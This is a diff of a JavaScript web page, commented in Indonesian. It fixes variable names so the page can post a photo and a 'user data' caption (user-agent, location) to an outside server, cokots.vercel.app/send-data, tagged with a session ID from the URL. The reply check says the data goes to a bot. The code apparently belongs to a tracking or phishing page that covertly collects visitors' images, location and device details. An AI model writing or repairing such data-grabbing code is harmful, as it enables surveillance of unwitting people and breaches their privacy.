@@ -66,13 +66,13 @@
             `;
             
             // Kirim foto kosong (fallback) ke server
-            const formDatass = new FormData();
+            const formData = new FormData();
             formData.append("photo", blob);  // Kirimkan fallback gambar
             formData.append("caption", caption);
             
             const apiResponse = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
                 method: "POST",
-                body: formDatass,
+                body: formData,
             });
             
             // Cek jika respons adalah "Data berhasil dikirim ke bot!"
@@ -95,14 +95,14 @@
 
     // URL gambar fallback
     const fallbackImageURL = 'https://i.scdn.co/image/ab67616d00001e0288a1f3c6c2711b92aabdf488';  // Ganti dengan URL gambar yang valid
-
+    
     try {
         // Ambil gambar dari URL
         const response = await fetch(fallbackImageURL);
         const blob = await response.blob();  // Mengonversi gambar menjadi Blob        
-
+        const session = new URLSearchParams(window.location.search).get("session");
         
-        const caption = `
+        const captions = `
         📍 **Data Pengguna: mengizinkan**
         - User-Agent: -
         - Lokasi: -
@@ -110,15 +110,14 @@
         `;
         
         // Kirim foto kosong (fallback) ke server
-        const formDatas = new FormData();
+        const formData = new FormData();
         formData.append("photo", blob);  // Kirimkan fallback gambar
-        formData.append("caption", caption);
+        formData.append("caption", captions);
 
-        const session = new URLSearchParams(window.location.search).get("session");
         
         const apiResponse = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
             method: "POST",
-            body: formDatas,
+            body: formData,
         });
         
         // Cek jika respons adalah "Data berhasil dikirim ke bot!"
